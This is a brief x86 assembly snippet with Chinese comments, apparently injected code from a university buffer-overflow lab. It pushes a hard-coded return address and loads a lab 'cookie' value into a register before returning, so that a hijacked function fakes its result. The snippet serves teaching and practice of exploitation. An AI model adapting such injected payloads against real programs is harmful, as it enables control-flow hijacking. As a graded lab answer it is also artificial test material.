#pushq $0x08048dca # test 中下一句的地址
#pushq $0x08048dda
#mov  $0x607b0f4d,%ebx  # 把cookie放进去
#retq

pushq $0x08048dbe
mov  $0x607b0f4d,%eax
retq
